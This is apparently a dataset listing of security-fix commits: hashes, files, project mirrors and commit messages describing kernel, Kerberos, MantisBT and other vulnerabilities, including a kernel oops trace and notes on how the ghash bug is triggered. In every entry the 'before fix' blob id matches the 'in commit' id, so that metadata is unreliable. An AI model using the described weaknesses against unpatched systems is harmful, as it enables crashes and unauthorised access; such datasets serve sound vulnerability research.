Commit With Fix: 
    667eff35a1f56fa74ce98a0c7c29a40adc1ba4e3
File(s) In Commit: 
    fs/ext4/extents.c
Blob(s) In Commit: 
    e363f21b091bcbac17b84a3bbdee6a6d5d20d65d
Blob(s) Before Fix: 
    e363f21b091bcbac17b84a3bbdee6a6d5d20d65d
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 667eff35a1f56fa74ce98a0c7c29a40adc1ba4e3:
ext4: reimplement convert and split_unwritten\n\nReimplement ext4_ext_convert_to_initialized() and ext4_split_unwritten_extents() using ext4_split_extent()\n\nSigned-off-by: Yongqiang Yang <xiaoqiangnk@gmail.com> Signed-off-by: "Theodore Ts'o" <tytso@mit.edu> Tested-by: Allison Henderson <achender@linux.vnet.ibm.com>

======================================================================
Commit With Fix: 
    bfdc0b497faa82a0ba2f9dddcf109231dd519fcc
File(s) In Commit: 
    kernel/sysctl.c
Blob(s) In Commit: 
    c0bb32414b174d575f836c9eb779f2e30cb793dd
Blob(s) Before Fix: 
    c0bb32414b174d575f836c9eb779f2e30cb793dd
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for bfdc0b497faa82a0ba2f9dddcf109231dd519fcc:
sysctl: restrict write access to dmesg_restrict\n\nWhen dmesg_restrict is set to 1 CAP_SYS_ADMIN is needed to read the kernel ring buffer.  But a root user without CAP_SYS_ADMIN is able to reset dmesg_restrict to 0.\n\nThis is an issue when e.g.  LXC (Linux Containers) are used and complete user space is running without CAP_SYS_ADMIN.  A unprivileged and jailed root user can bypass the dmesg_restrict protection.\n\nWith this patch writing to dmesg_restrict is only allowed when root has CAP_SYS_ADMIN.\n\nSigned-off-by: Richard Weinberger <richard@nod.at> Acked-by: Dan Rosenberg <drosenberg@vsecurity.com> Acked-by: Serge E. Hallyn <serge@hallyn.com> Cc: Eric Paris <eparis@redhat.com> Cc: Kees Cook <kees.cook@canonical.com> Cc: James Morris <jmorris@namei.org> Cc: Eugene Teo <eugeneteo@kernel.org> Cc: <stable@kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    7ed47b7d142ec99ad6880bbbec51e9f12b3af74c
File(s) In Commit: 
    crypto/ghash-generic.c
Blob(s) In Commit: 
    7835b8fc94db6d69b9e93c1806d677e8ea390736
Blob(s) Before Fix: 
    7835b8fc94db6d69b9e93c1806d677e8ea390736
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 7ed47b7d142ec99ad6880bbbec51e9f12b3af74c:
crypto: ghash - Avoid null pointer dereference if no key is set\n\nThe ghash_update function passes a pointer to gf128mul_4k_lle which will be NULL if ghash_setkey is not called or if the most recent call to ghash_setkey failed to allocate memory.  This causes an oops.  Fix this up by returning an error code in the null case.\n\nThis is trivially triggered from unprivileged userspace through the AF_ALG interface by simply writing to the socket without setting a key.\n\nThe ghash_final function has a similar issue, but triggering it requires a memory allocation failure in ghash_setkey _after_ at least one successful call to ghash_update.\n\n  BUG: unable to handle kernel NULL pointer dereference at 00000670   IP: [<d88c92d4>] gf128mul_4k_lle+0x23/0x60 [gf128mul]   *pde = 00000000   Oops: 0000 [#1] PREEMPT SMP   Modules linked in: ghash_generic gf128mul algif_hash af_alg nfs lockd nfs_acl sunrpc bridge ipv6 stp llc\n\n  Pid: 1502, comm: hashatron Tainted: G        W   3.1.0-rc9-00085-ge9308cf #32 Bochs Bochs   EIP: 0060:[<d88c92d4>] EFLAGS: 00000202 CPU: 0   EIP is at gf128mul_4k_lle+0x23/0x60 [gf128mul]   EAX: d69db1f0 EBX: d6b8ddac ECX: 00000004 EDX: 00000000   ESI: 00000670 EDI: d6b8ddac EBP: d6b8ddc8 ESP: d6b8dda4    DS: 007b ES: 007b FS: 00d8 GS: 0033 SS: 0068   Process hashatron (pid: 1502, ti=d6b8c000 task=d6810000 task.ti=d6b8c000)   Stack:    00000000 d69db1f0 00000163 00000000 d6b8ddc8 c101a520 d69db1f0 d52aa000    00000ff0 d6b8dde8 d88d310f d6b8a3f8 d52aa000 00001000 d88d502c d6b8ddfc    00001000 d6b8ddf4 c11676ed d69db1e8 d6b8de24 c11679ad d52aa000 00000000   Call Trace:    [<c101a520>] ? kmap_atomic_prot+0x37/0xa6    [<d88d310f>] ghash_update+0x85/0xbe [ghash_generic]    [<c11676ed>] crypto_shash_update+0x18/0x1b    [<c11679ad>] shash_ahash_update+0x22/0x36    [<c11679cc>] shash_async_update+0xb/0xd    [<d88ce0ba>] hash_sendpage+0xba/0xf2 [algif_hash]    [<c121b24c>] kernel_sendpage+0x39/0x4e    [<d88ce000>] ? 0xd88cdfff    [<c121b298>] sock_sendpage+0x37/0x3e    [<c121b261>] ? kernel_sendpage+0x4e/0x4e    [<c10b4dbc>] pipe_to_sendpage+0x56/0x61    [<c10b4e1f>] splice_from_pipe_feed+0x58/0xcd    [<c10b4d66>] ? splice_from_pipe_begin+0x10/0x10    [<c10b51f5>] __splice_from_pipe+0x36/0x55    [<c10b4d66>] ? splice_from_pipe_begin+0x10/0x10    [<c10b6383>] splice_from_pipe+0x51/0x64    [<c10b63c2>] ? default_file_splice_write+0x2c/0x2c    [<c10b63d5>] generic_splice_sendpage+0x13/0x15    [<c10b4d66>] ? splice_from_pipe_begin+0x10/0x10    [<c10b527f>] do_splice_from+0x5d/0x67    [<c10b6865>] sys_splice+0x2bf/0x363    [<c129373b>] ? sysenter_exit+0xf/0x16    [<c104dc1e>] ? trace_hardirqs_on_caller+0x10e/0x13f    [<c129370c>] sysenter_do_call+0x12/0x32   Code: 83 c4 0c 5b 5e 5f c9 c3 55 b9 04 00 00 00 89 e5 57 8d 7d e4 56 53 8d 5d e4 83 ec 18 89 45 e0 89 55 dc 0f b6 70 0f c1 e6 04 01 d6 <f3> a5 be 0f 00 00 00 4e 89 d8 e8 48 ff ff ff 8b 45 e0 89 da 0f   EIP: [<d88c92d4>] gf128mul_4k_lle+0x23/0x60 [gf128mul] SS:ESP 0068:d6b8dda4   CR2: 0000000000000670   ---[ end trace 4eaa2a86a8e2da24 ]---   note: hashatron[1502] exited with preempt_count 1   BUG: scheduling while atomic: hashatron/1502/0x10000002   INFO: lockdep is turned off.   [...]\n\nSigned-off-by: Nick Bowler <nbowler@elliptictech.com> Cc: stable@kernel.org [2.6.37+] Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

======================================================================
Commit With Fix: 
    15291164b22a357cb211b618adfef4fa82fc0de3
File(s) In Commit: 
    fs/jbd2/transaction.c
Blob(s) In Commit: 
    5265330625484b7475d3073e2d358ec2cefaf71a
Blob(s) Before Fix: 
    5265330625484b7475d3073e2d358ec2cefaf71a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 15291164b22a357cb211b618adfef4fa82fc0de3:
jbd2: clear BH_Delay & BH_Unwritten in journal_unmap_buffer\n\njournal_unmap_buffer()'s zap_buffer: code clears a lot of buffer head state ala discard_buffer(), but does not touch _Delay or _Unwritten as discard_buffer() does.\n\nThis can be problematic in some areas of the ext4 code which assume that if they have found a buffer marked unwritten or delay, then it's a live one.  Perhaps those spots should check whether it is mapped as well, but if jbd2 is going to tear down a buffer, let's really tear it down completely.\n\nWithout this I get some fsx failures on sub-page-block filesystems up until v3.2, at which point 4e96b2dbbf1d7e81f22047a50f862555a6cb87cb and 189e868fa8fdca702eb9db9d8afc46b5cb9144c9 make the failures go away, because buried within that large change is some more flag clearing.  I still think it's worth doing in jbd2, since ->invalidatepage leads here directly, and it's the right place to clear away these flags.\n\nSigned-off-by: Eric Sandeen <sandeen@redhat.com> Signed-off-by: "Theodore Ts'o" <tytso@mit.edu> Cc: stable@vger.kernel.org

======================================================================
Commit With Fix: 
    f8e9881c2aef1e982e5abc25c046820cd0b7cf64
File(s) In Commit: 
    net/bridge/br_netfilter.c
Blob(s) In Commit: 
    f3bc322c589128d14d6367368597f6da66958bcb
Blob(s) Before Fix: 
    f3bc322c589128d14d6367368597f6da66958bcb
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for f8e9881c2aef1e982e5abc25c046820cd0b7cf64:
bridge: reset IPCB in br_parse_ip_options\n\nCommit 462fb2af9788a82 (bridge : Sanitize skb before it enters the IP stack), missed one IPCB init before calling ip_options_compile()\n\nThanks to Scot Doyle for his tests and bug reports.\n\nReported-by: Scot Doyle <lkml@scotdoyle.com> Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com> Cc: Hiroaki SHIMODA <shimoda.hiroaki@gmail.com> Acked-by: Bandan Das <bandan.das@stratus.com> Acked-by: Stephen Hemminger <shemminger@vyatta.com> Cc: Jan Lübbe <jluebbe@debian.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    56c6a8a4aadca809e04276eabe5552935c51387f
File(s) In Commit: 
    mm/oom_kill.c
Blob(s) In Commit: 
    e9a17857a203d24dd1d90d6d6f6cabd39566efab
Blob(s) Before Fix: 
    e9a17857a203d24dd1d90d6d6f6cabd39566efab
Projects:
    0-T-0_ps4-linux
Commit Message for 56c6a8a4aadca809e04276eabe5552935c51387f:
oom: fix integer overflow of points in oom_badness\n\ncommit ff05b6f7ae762b6eb464183eec994b28ea09f6dd upstream.\n\nAn integer overflow will happen on 64bit archs if task's sum of rss, swapents and nr_ptes exceeds (2^31)/1000 value.  This was introduced by commit\n\nf755a04 oom: use pte pages in OOM score\n\nwhere the oom score computation was divided into several steps and it's no longer computed as one expression in unsigned long(rss, swapents, nr_pte are unsigned long), where the result value assigned to points(int) is in range(1..1000).  So there could be an int overflow while computing\n\n176          points *= 1000 \n\nand points may have negative value. Meaning the oom score for a mem hog task will be one.\n\n196          if (points <= 0) 197                  return 1 \n\nFor example: [ 3366]     0  3366 35390480 24303939   5       0             0 oom01 Out of memory: Kill process 3366 (oom01) score 1 or sacrifice child\n\nHere the oom1 process consumes more than 24303939(rss)*4096~=92GB physical memory, but it's oom score is one.\n\nIn this situation the mem hog task is skipped and oom killer kills another and most probably innocent task with oom score greater than one.\n\nThe points variable should be of type long instead of int to prevent the int overflow.\n\nSigned-off-by: Frantisek Hrbata <fhrbata@redhat.com> Acked-by: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com> Acked-by: Oleg Nesterov <oleg@redhat.com> Acked-by: David Rientjes <rientjes@google.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>\n\n

======================================================================
Commit With Fix: 
    e8af315211b07c8f48f32a063233cc3f76dd5bc2
File(s) In Commit: 
    tastypie/serializers.py
Blob(s) In Commit: 
    5ff95d4a52cf39dd8ca60a49dc0578f3b09d576b
Blob(s) Before Fix: 
    5ff95d4a52cf39dd8ca60a49dc0578f3b09d576b
Projects:
    00stefan00_django-tastypie
Commit Message for e8af315211b07c8f48f32a063233cc3f76dd5bc2:
Safer loading of YAML. Thanks to daveyss for the report!

======================================================================
Commit With Fix: 
    a9cf73ea7ff78f52662c8658d93c226effbbedde
File(s) In Commit: 
    net/ipv6/udp.c
Blob(s) In Commit: 
    9e305d74b3d41a99a065da67fe54bd3a4a9ebaa6
Blob(s) Before Fix: 
    9e305d74b3d41a99a065da67fe54bd3a4a9ebaa6
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a9cf73ea7ff78f52662c8658d93c226effbbedde:
ipv6: udp: fix the wrong headroom check\n\nAt this point, skb->data points to skb_transport_header. So, headroom check is wrong.\n\nFor some case:bridge(UFO is on) + eth device(UFO is off), there is no enough headroom for IPv6 frag head. But headroom check is always false.\n\nThis will bring about data be moved to there prior to skb->head, when adding IPv6 frag header to skb.\n\nSigned-off-by: Shan Wei <shanwei@cn.fujitsu.com> Acked-by: Herbert Xu <herbert@gondor.apana.org.au> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    ae53b5bd77719fed58086c5be60ce4f22bffe1c6
File(s) In Commit: 
    net/sctp/input.c
Blob(s) In Commit: 
    2e4a8646dbc389dcb55fcce1cf6b3ad0f608af0d
Blob(s) Before Fix: 
    2e4a8646dbc389dcb55fcce1cf6b3ad0f608af0d
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for ae53b5bd77719fed58086c5be60ce4f22bffe1c6:
sctp: Fix another socket race during accept/peeloff\n\nThere is a race between sctp_rcv() and sctp_accept() where we have moved the association from the listening socket to the accepted socket, but sctp_rcv() processing cached the old socket and continues to use it.\n\nThe easy solution is to check for the socket mismatch once we've grabed the socket lock.  If we hit a mis-match, that means that were are currently holding the lock on the listening socket, but the association is refrencing a newly accepted socket.  We need to drop the lock on the old socket and grab the lock on the new one.\n\nA more proper solution might be to create accepted sockets when the new association is established, similar to TCP.  That would eliminate the race for 1-to-1 style sockets, but it would still existing for 1-to-many sockets where a user wished to peeloff an association.  For now, we'll live with this easy solution as it addresses the problem.\n\nReported-by: Michal Hocko <mhocko@suse.cz> Reported-by: Karsten Keil <kkeil@suse.de> Signed-off-by: Vlad Yasevich <vladislav.yasevich@hp.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    bc909d9ddbf7778371e36a651d6e4194b1cc7d4c
File(s) In Commit: 
    net/socket.c
Blob(s) In Commit: 
    ffe92ca32f2acc031605e69d13614b6c8374bed3
Blob(s) Before Fix: 
    ffe92ca32f2acc031605e69d13614b6c8374bed3
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for bc909d9ddbf7778371e36a651d6e4194b1cc7d4c:
sendmmsg/sendmsg: fix unsafe user pointer access\n\nDereferencing a user pointer directly from kernel-space without going through the copy_from_user family of functions is a bad idea. Two of such usages can be found in the sendmsg code path called from sendmmsg, added by\n\ncommit c71d8ebe7a4496fb7231151cb70a6baa0cb56f9a upstream. commit 5b47b8038f183b44d2d8ff1c7d11a5c1be706b34 in the 3.0-stable tree.\n\nUsages are performed through memcmp() and memcpy() directly. Fix those by using the already copied msg_sys structure instead of the __user *msg structure. Note that msg_sys can be set to NULL by verify_compat_iovec() or verify_iovec(), which requires additional NULL pointer checks.\n\nSigned-off-by: Mathieu Desnoyers <mathieu.desnoyers@efficios.com> Signed-off-by: David Goulet <dgoulet@ev0ke.net> CC: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp> CC: Anton Blanchard <anton@samba.org> CC: David S. Miller <davem@davemloft.net> CC: stable <stable@kernel.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    b5a1eeef04cc7859f34dec9b72ea1b28e4aba07c
File(s) In Commit: 
    net/batman-adv/icmp_socket.c
Blob(s) In Commit: 
    d9c1e7bb7fbfa4ba6d5d579bfe1b266cbab65052
Blob(s) Before Fix: 
    d9c1e7bb7fbfa4ba6d5d579bfe1b266cbab65052
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b5a1eeef04cc7859f34dec9b72ea1b28e4aba07c:
batman-adv: Only write requested number of byte to user buffer\n\nDon't write more than the requested number of bytes of an batman-adv icmp packet to the userspace buffer. Otherwise unrelated userspace memory might get overridden by the kernel.\n\nSigned-off-by: Sven Eckelmann <sven@narfation.org> Signed-off-by: Marek Lindner <lindner_marek@yahoo.de>

======================================================================
Commit With Fix: 
    8ea6f7bc37d05a9ec25b5afbea011cf9de5f1e49
File(s) In Commit: 
    C4/Output.pm
Blob(s) In Commit: 
    155c5c4cad12f07c6325e35a230481c4d11113a3
Blob(s) Before Fix: 
    155c5c4cad12f07c6325e35a230481c4d11113a3
Projects:
    24455287_Koha
Commit Message for 8ea6f7bc37d05a9ec25b5afbea011cf9de5f1e49:
[#21464023] Security: arbitrary file inclusion\n\nPoor input cleansing can allow a well-constructed cookie to return the contents of arbitrary file system objects.

======================================================================
Commit With Fix: 
    be20250c13f88375345ad99950190685eda51eb8
File(s) In Commit: 
    net/rose/rose_subr.c
Blob(s) In Commit: 
    174d51c9ce37774f1a046ff49f0157d265e1a5bb
Blob(s) Before Fix: 
    174d51c9ce37774f1a046ff49f0157d265e1a5bb
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for be20250c13f88375345ad99950190685eda51eb8:
ROSE: prevent heap corruption with bad facilities\n\nWhen parsing the FAC_NATIONAL_DIGIS facilities field, it's possible for a remote host to provide more digipeaters than expected, resulting in heap corruption.  Check against ROSE_MAX_DIGIS to prevent overflows, and abort facilities parsing on failure.\n\nAdditionally, when parsing the FAC_CCITT_DEST_NSAP and FAC_CCITT_SRC_NSAP facilities fields, a remote host can provide a length of less than 10, resulting in an underflow in a memcpy size, causing a kernel panic due to massive heap corruption.  A length of greater than 20 results in a stack overflow of the callsign array.  Abort facilities parsing on these invalid length values.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: stable@kernel.org Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    1b1ec5ce75e224bd1755650c18ccdaa6dc53e605
File(s) In Commit: 
    src/modules/rlm_unix/rlm_unix.c
Blob(s) In Commit: 
    abec68c9d9d0318164a7d5c175f359f25f3c6685
Blob(s) Before Fix: 
    abec68c9d9d0318164a7d5c175f359f25f3c6685
Projects:
    0xbad0c0d3_freeradius-server
Commit Message for 1b1ec5ce75e224bd1755650c18ccdaa6dc53e605:
heck for account and password expiration

======================================================================
Commit With Fix: 
    59f81ea6bd8ef96c04a706a3ca453cd656284faa
File(s) In Commit: 
    Kwf/Exception/Abstract.php
Blob(s) In Commit: 
    6da4ece7261faa28c2c9a587d2055febbe04f9ef
Blob(s) Before Fix: 
    6da4ece7261faa28c2c9a587d2055febbe04f9ef
Projects:
    Ben-Ho_koala-framework
Commit Message for 59f81ea6bd8ef96c04a706a3ca453cd656284faa:
fix XSS security issue: escape request_uri in 404 pages

======================================================================
Commit With Fix: 
    33f0e9c58bbf047e1b401a834f3abfe72d9a8947
File(s) In Commit: 
    chef-server-api/app/controllers/clients.rb
Blob(s) In Commit: 
    efa2b4a3d448cc2df6817c8c2d6ca4199fbcff40
Blob(s) Before Fix: 
    efa2b4a3d448cc2df6817c8c2d6ca4199fbcff40
Projects:
    17601606252_chef
Commit Message for 33f0e9c58bbf047e1b401a834f3abfe72d9a8947:
CHEF-2649: Only allow admin clients to create admins (not validators)

======================================================================
Commit With Fix: 
    c290f8358acaeffd8e0c551ddcc24d1206143376
File(s) In Commit: 
    drivers/tty/tty_io.c
Blob(s) In Commit: 
    6913da8f202cd7fc4f82c33ead60c462dcf9e3a5
Blob(s) Before Fix: 
    6913da8f202cd7fc4f82c33ead60c462dcf9e3a5
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c290f8358acaeffd8e0c551ddcc24d1206143376:
TTY: drop driver reference in tty_open fail path\n\nWhen tty_driver_lookup_tty fails in tty_open, we forget to drop a reference to the tty driver. This was added by commit 4a2b5fddd5 (Move tty lookup/reopen to caller).\n\nFix that by adding tty_driver_kref_put to the fail path.\n\nI will refactor the code later. This is for the ease of backporting to stable.\n\nIntroduced-in: v2.6.28-rc2 Signed-off-by: Jiri Slaby <jslaby@suse.cz> Cc: stable <stable@vger.kernel.org> Cc: Alan Cox <alan@lxorguk.ukuu.org.uk> Acked-by: Sukadev Bhattiprolu <sukadev@linux.vnet.ibm.com> Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>

======================================================================
Commit With Fix: 
    11508aa72efab4fad0dbd8292b9614d9371b20a9
File(s) In Commit: 
    modules/bouncedcc.cpp
Blob(s) In Commit: 
    d06ecf0e92c97c7ae5148b560ae7e2791db2b480
Blob(s) Before Fix: 
    d06ecf0e92c97c7ae5148b560ae7e2791db2b480
Projects:
    126carpower_znc
Commit Message for 11508aa72efab4fad0dbd8292b9614d9371b20a9:
Fix crash in bouncedcc module.\n\nIt happens when DCC RESUME is received. Affected ZNC versions: 0.200, 0.202.\n\nThanks to howeyc for reporting this and providing the patch.

======================================================================
Commit With Fix: 
    802f43594d6e4d2ac61086d239153c17873a0428
File(s) In Commit: 
    fs/aio.c
Blob(s) In Commit: 
    969beb0e22311a4f7e7f4155524709d5dd8269bf
Blob(s) Before Fix: 
    969beb0e22311a4f7e7f4155524709d5dd8269bf
Projects:
    0-T-0_ps4-linux
Commit Message for 802f43594d6e4d2ac61086d239153c17873a0428:
Unused iocbs in a batch should not be accounted as active.\n\ncommit 69e4747ee9727d660b88d7e1efe0f4afcb35db1b upstream.\n\nSince commit 080d676de095 ("aio: allocate kiocbs in batches") iocbs are allocated in a batch during processing of first iocbs.  All iocbs in a batch are automatically added to ctx->active_reqs list and accounted in ctx->reqs_active.\n\nIf one (not the last one) of iocbs submitted by an user fails, further iocbs are not processed, but they are still present in ctx->active_reqs and accounted in ctx->reqs_active.  This causes process to stuck in a D state in wait_for_all_aios() on exit since ctx->reqs_active will never go down to zero.  Furthermore since kiocb_batch_free() frees iocb without removing it from active_reqs list the list become corrupted which may cause oops.\n\nFix this by removing iocb from ctx->active_reqs and updating ctx->reqs_active in kiocb_batch_free().\n\nSigned-off-by: Gleb Natapov <gleb@redhat.com> Reviewed-by: Jeff Moyer <jmoyer@redhat.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>\n\n

======================================================================
Commit With Fix: 
    2702b1526c7278c4d65d78de209a465d4de2885e
File(s) In Commit: 
    kernel/sys.c
Blob(s) In Commit: 
    01865c6fb6a0c4739a18a5f4b746a5b8da038680
Blob(s) Before Fix: 
    01865c6fb6a0c4739a18a5f4b746a5b8da038680
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2702b1526c7278c4d65d78de209a465d4de2885e:
kernel/sys.c: fix stack memory content leak via UNAME26\n\nCalling uname() with the UNAME26 personality set allows a leak of kernel stack contents.  This fixes it by defensively calculating the length of copy_to_user() call, making the len argument unsigned, and initializing the stack buffer to zero (now technically unneeded, but hey, overkill).\n\nCVE-2012-0957\n\nReported-by: PaX Team <pageexec@freemail.hu> Signed-off-by: Kees Cook <keescook@chromium.org> Cc: Andi Kleen <ak@linux.intel.com> Cc: PaX Team <pageexec@freemail.hu> Cc: Brad Spengler <spender@grsecurity.net> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    c5be6209311d4a8f10fda37d0d3f876c1b33b77b
File(s) In Commit: 
    src/lib/kadm5/srv/svr_principal.c
Blob(s) In Commit: 
    f5ea005b2738d58afb89b2015747dfafdabc882c
Blob(s) Before Fix: 
    f5ea005b2738d58afb89b2015747dfafdabc882c
Projects:
    3van_krb5
Commit Message for c5be6209311d4a8f10fda37d0d3f876c1b33b77b:
Null pointer deref in kadmind [CVE-2012-1013]\n\nThe fix for #6626 could cause kadmind to dereference a null pointer if a create-principal request contains no password but does contain the KRB5_KDB_DISALLOW_ALL_TIX flag (e.g. "addprinc -randkey -allow_tix name").  Only clients authorized to create principals can trigger the bug.  Fix the bug by testing for a null password in check_1_6_dummy.\n\nCVSSv2 vector: AV:N/AC:M/Au:S/C:N/I:N/A:P/E:H/RL:O/RC:C\n\n[ghudson@mit.edu: Minor style change and commit message]\n\nticket: 7152 target_version: 1.10.2 tags: pullup

======================================================================
Commit With Fix: 
    db64ca25d661a47b996b4e2645998b5d7f0eb52c
File(s) In Commit: 
    src/plugins/preauth/pkinit/pkinit_srv.c
Blob(s) In Commit: 
    c271bf98148c1323398cab32c581a7a27ad5fa81
Blob(s) Before Fix: 
    c271bf98148c1323398cab32c581a7a27ad5fa81
Projects:
    3van_krb5
Commit Message for db64ca25d661a47b996b4e2645998b5d7f0eb52c:
PKINIT (draft9) null ptr deref [CVE-2012-1016]\n\nDon't check for an agility KDF identifier in the non-draft9 reply structure when we're building a draft9 reply, because it'll be NULL.\n\nThe KDC plugin for PKINIT can dereference a null pointer when handling a draft9 request, leading to a crash of the KDC process.  An attacker would need to have a valid PKINIT certificate, or an unauthenticated attacker could execute the attack if anonymous PKINIT is enabled.\n\nCVSSv2 vector: AV:N/AC:M/Au:N/C:N/I:N/A:P/E:P/RL:O/RC:C\n\n[tlyu@mit.edu: reformat comment and edit log message]\n\n(back ported from commit cd5ff932c9d1439c961b0cf9ccff979356686aff)\n\nticket: 7527 (new) version_fixed: 1.10.4 status: resolved

======================================================================
Commit With Fix: 
    88d7d4e4a439f32acc56a6d860e415ee71d3df08
File(s) In Commit: 
    fs/cifs/dir.c
Blob(s) In Commit: 
    bf68b4fc9512f0ad226f9503dffbc50d8818138c
Blob(s) Before Fix: 
    bf68b4fc9512f0ad226f9503dffbc50d8818138c
Projects:
    0-T-0_ps4-linux
Commit Message for 88d7d4e4a439f32acc56a6d860e415ee71d3df08:
cifs: fix dentry refcount leak when opening a FIFO on lookup\n\ncommit 5bccda0ebc7c0331b81ac47d39e4b920b198b2cd upstream.\n\nThe cifs code will attempt to open files on lookup under certain circumstances. What happens though if we find that the file we opened was actually a FIFO or other special file?\n\nCurrently, the open filehandle just ends up being leaked leading to a dentry refcount mismatch and oops on umount. Fix this by having the code close the filehandle on the server if it turns out not to be a regular file. While we're at it, change this spaghetti if statement into a switch too.\n\nReported-by: CAI Qian <caiqian@redhat.com> Tested-by: CAI Qian <caiqian@redhat.com> Reviewed-by: Shirish Pargaonkar <shirishpargaonkar@gmail.com> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <smfrench@gmail.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\n\n

======================================================================
Commit With Fix: 
    77d61c6eca4d08b9b025738acf6b926cc750db23
File(s) In Commit: 
    taglib/ape/apeproperties.cpp
Blob(s) In Commit: 
    4f14d6c5eca4ee38afa146fa897e8af19e48485a
Blob(s) Before Fix: 
    4f14d6c5eca4ee38afa146fa897e8af19e48485a
Projects:
    121340129_taglib
Commit Message for 77d61c6eca4d08b9b025738acf6b926cc750db23:
Make sure to not try dividing by zero

======================================================================
Commit With Fix: 
    b3646a07348ffa276ea41a9dae03ddc63ea6c532
File(s) In Commit: 
    taglib/ogg/xiphcomment.cpp
Blob(s) In Commit: 
    e7e8fa915a8ede594548012dd6de92bddbc29ab5
Blob(s) Before Fix: 
    e7e8fa915a8ede594548012dd6de92bddbc29ab5
Projects:
    121340129_taglib
Commit Message for b3646a07348ffa276ea41a9dae03ddc63ea6c532:
Be more careful when parsing Vorbis Comments

======================================================================
Commit With Fix: 
    eb803ed02105fc919cf5f789e939f2b824162927
File(s) In Commit: 
    core/access_api.php
Blob(s) In Commit: 
    c05ad005fb3df7b419e61e96d7ceb43ba9ae2d7b
Blob(s) Before Fix: 
    c05ad005fb3df7b419e61e96d7ceb43ba9ae2d7b
Projects:
    01-Scripts_mantisbt
Commit Message for eb803ed02105fc919cf5f789e939f2b824162927:
Fix bug in access_has_bug_level() for private issues\n\nWhen private_bug_threshold is defined as an array instead of a single access level, e.g. array(0=>40, 1=>70, 2=>90) to prevent developers from seeing private bugs while granting that privilege to updaters, access_has_bug_level() incorrectly returned true.\n\nThe consequence is that unwanted access to Private bugs was granted to users who are allowed to view them, e.g. allowing them to delete or perform other restricted actions.\n\nFixes #10124

======================================================================
Commit With Fix: 
    df7782a65e96aa1c9639a7625a658102134c7fe0
File(s) In Commit: 
    api/soap/mc_issue_api.php
Blob(s) In Commit: 
    cf823da63dcf261ae96d1852d2ccdb0fd4d39790
Blob(s) Before Fix: 
    cf823da63dcf261ae96d1852d2ccdb0fd4d39790
Projects:
    01-Scripts_mantisbt
Commit Message for df7782a65e96aa1c9639a7625a658102134c7fe0:
SOAP API: proper access checks when deleting bugs\n\nAffects #13656 : Reporters have read/write access to existing data of other users

======================================================================
Commit With Fix: 
    0da3f7ace233208eb3c8d628cc2fd6e56d83839f
File(s) In Commit: 
    bug_actiongroup.php
Blob(s) In Commit: 
    c68a07fb1277e0688ca7bc8aeae0d9dcc5d3b995
Blob(s) Before Fix: 
    c68a07fb1277e0688ca7bc8aeae0d9dcc5d3b995
Projects:
    01-Scripts_mantisbt
Commit Message for 0da3f7ace233208eb3c8d628cc2fd6e56d83839f:
Fix Move bugs from projects with access < report_bug_threshold\n\nThe access check in bug_actiongroup.php was not correct. It should verify the user's report_bug_threshold in the target project, not the current project.\n\nFixes #13748

======================================================================
Commit With Fix: 
    f5106be52cf6aa72c521f388e4abb5f0de1f1d7f
File(s) In Commit: 
    api/soap/mc_api.php
Blob(s) In Commit: 
    a81781ae1bd40694f4fe2065726a470b87be4ff7
Blob(s) Before Fix: 
    a81781ae1bd40694f4fe2065726a470b87be4ff7
Projects:
    01-Scripts_mantisbt
Commit Message for f5106be52cf6aa72c521f388e4abb5f0de1f1d7f:
Fix 0013901: SOAP API allows invoking methods without proper authentication\n\nNote: only applied to 1.2.x not 'next', as the code is changing anyway

======================================================================
Commit With Fix: 
    371528caec553785c37f73fa3926ea0de84f986f
File(s) In Commit: 
    mm/memcontrol.c
Blob(s) In Commit: 
    228d6461c12ade8941b37416ca867d3df3277acd
Blob(s) Before Fix: 
    228d6461c12ade8941b37416ca867d3df3277acd
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 371528caec553785c37f73fa3926ea0de84f986f:
